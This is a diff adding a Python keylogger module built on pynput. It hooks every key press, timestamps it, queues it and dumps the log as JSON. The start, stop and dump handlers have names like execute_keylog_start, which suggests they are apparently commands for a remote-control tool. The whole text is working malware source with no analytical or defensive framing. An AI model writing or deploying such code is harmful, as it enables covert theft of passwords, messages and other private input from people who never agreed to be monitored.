@@ -1,0 +1,84 @@
+# ============================================
+# KEYLOGGER MODULE
+# ============================================
+try:
+    from pynput import keyboard
+    import threading
+    import queue
+    
+    KEYLOGGER_AVAILABLE = True
+except ImportError:
+    KEYLOGGER_AVAILABLE = False
+
+if KEYLOGGER_AVAILABLE:
+    class Keylogger:
+        """Simple keylogger implementation"""
+        
+        def __init__(self):
+            self.keys = queue.Queue()
+            self.listener = None
+            self.running = False
+        
+        def on_press(self, key):
+            """Called when a key is pressed"""
+            try:
+                char = key.char
+            except AttributeError:
+                # Special key
+                char = f"[{key.name}]"
+            
+            self.keys.put({
+                "key": char,
+                "timestamp": datetime.now().isoformat()
+            })
+        
+        def start(self):
+            """Start keylogger"""
+            if self.running:
+                return "Keylogger already running"
+            
+            self.running = True
+            self.listener = keyboard.Listener(on_press=self.on_press)
+            self.listener.start()
+            return "Keylogger started"
+        
+        def stop(self):
+            """Stop keylogger"""
+            if not self.running:
+                return "Keylogger not running"
+            
+            self.running = False
+            if self.listener:
+                self.listener.stop()
+            return "Keylogger stopped"
+        
+        def dump(self):
+            """Get collected keys"""
+            keys = []
+            while not self.keys.empty():
+                keys.append(self.keys.get())
+            
+            return json.dumps(keys)
+    
+    # Global keylogger instance
+    keylogger = Keylogger()
+else:
+    keylogger = None
+
+def execute_keylog_start():
+    """Start keylogger"""
+    if not KEYLOGGER_AVAILABLE:
+        return None, "Keylogger module not available (install pynput)"
+    return keylogger.start(), None
+
+def execute_keylog_stop():
+    """Stop keylogger"""
+    if not KEYLOGGER_AVAILABLE:
+        return None, "Keylogger module not available"
+    return keylogger.stop(), None
+
+def execute_keylog_dump():
+    """Get keylog data"""
+    if not KEYLOGGER_AVAILABLE:
+        return None, "Keylogger module not available"
+    return keylogger.dump(), None
